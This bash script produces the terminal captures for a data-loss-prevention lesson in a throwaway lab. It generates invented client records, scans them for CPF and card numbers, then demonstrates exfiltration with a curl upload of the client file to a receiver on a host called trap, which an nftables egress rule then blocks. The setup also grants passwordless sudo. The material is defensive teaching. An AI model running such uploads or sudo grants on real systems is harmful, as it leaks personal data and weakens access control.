#!/usr/bin/env bash
# The terminal sessions quoted in lesson 9 of defense-hardening, as a script that produces them.
#
# THE SCRIPT IS THE SOURCE AND ITS OUTPUT IS NOT COMMITTED. Every transcript in
# this lesson was copied from running it, so the next person can run it and see
# what moved.
#
#   sudo useradd -m -s /bin/bash ana                  # once, on a throwaway machine
#   echo 'ana ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/ana
#   sudo bash /path/to/captures.sh
#
# EVERY MACHINE IN THE LESSON IS PART OF ONE LAB, built by ../../lab.sh from
# the hostlab.sh lesson 1 shows: desk, web and trap are started fresh. A line
# that starts with ana@desk ran on the machine called desk, as ana.
#
# What is STAGED rather than typed:
# - fakedata.py, scan.py, guard.sh and egress.nft are written into ana's home
#   on desk, and recv.py into ana's home on trap, from this lesson's own
#   Markdown, byte for byte as the copy button hands them over: the student
#   pastes them.
# - recv.py is started on trap in the background before the upload block; the
#   lesson tells the student to start it in a shell of its own.
# - every client in the data is invented by fakedata.py; no CPF or card number
#   in this lesson belongs to anybody on purpose, and the cards start with 9999,
#   which no network issues.
# Every line after a prompt is what the command printed.
#
# Recorded on Ubuntu 24.04, TZ=America/Sao_Paulo.

set -uo pipefail
export TZ=America/Sao_Paulo LC_ALL=C.UTF-8 PAGER=cat SYSTEMD_PAGER=cat COLUMNS=100
here=$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")
LAB="$here/../../lab.sh"
lab() { bash "$LAB" "$@"; }
on() {    # on HOST 'command': ana at her prompt on one machine of the lab
  local h=$1; shift
  printf 'ana@%s:~$ %s\n' "$h" "$*"
  lab exec "$h" ana "$*" 2>&1 || true
}
block() { printf '##### %s\n' "$1"; }
put() {   # put HOST USER PATH FILE: write a file the lesson shows onto a machine
  python3 /var/tmp/dh/tools/fromlesson.py "$here" "$4" | lab exec "$1" "$2" "cat > $3"
}

lab up desk web trap >/dev/null 2>&1
for f in fakedata.py scan.py guard.sh egress.nft; do put desk ana "/home/ana/$f" "$f"; done
put trap ana /home/ana/recv.py recv.py

block generate
on desk 'python3 fakedata.py > clientes.csv; head -4 clientes.csv; wc -l clientes.csv'

block checks
on desk "python3 -c 'import scan; print(scan.cpf_ok(\"881.399.869-41\"), scan.cpf_ok(\"881.399.869-42\"))'"
on desk "python3 -c 'import scan; print(scan.luhn_ok(\"9999 8797 3091 1410\"), scan.luhn_ok(\"9999 8797 3091 1411\"))'"

block docs
on desk 'mkdir docs; mv clientes.csv docs/'
on desk 'printf "Pedido 12345678901 entregue\nPedido 98765432100 pendente\nCaixa 111.111.111-11\n" > docs/pedidos.txt'
on desk 'printf "Reunião de quinta às 10h, sala 2.\n" > docs/memo.txt'

block scan
on desk 'python3 scan.py docs'

block nocheck
on desk 'python3 scan.py --no-check docs'

block guard-start
on desk 'sudo systemd-run --uid=ana --unit dlp-guard bash ~/guard.sh'

block guard
on desk 'sleep 1; cp docs/memo.txt docs/clientes.csv outbox/; sleep 1; ls outbox held'
on desk 'sudo journalctl -t dlp -o cat --no-pager'

lab exec trap ana 'setsid python3 recv.py >/dev/null 2>&1 < /dev/null &' >/dev/null 2>&1
sleep 1

block upload
on desk 'curl -s -T docs/clientes.csv http://trap:8443/'

block egress
on desk 'sudo nft -f egress.nft'
on desk 'curl -s -m 3 -T docs/clientes.csv http://trap:8443/; echo "exit $?"'
on desk 'curl -s -m 3 http://web/'
on desk 'sudo nft list chain inet egress output | grep counter'
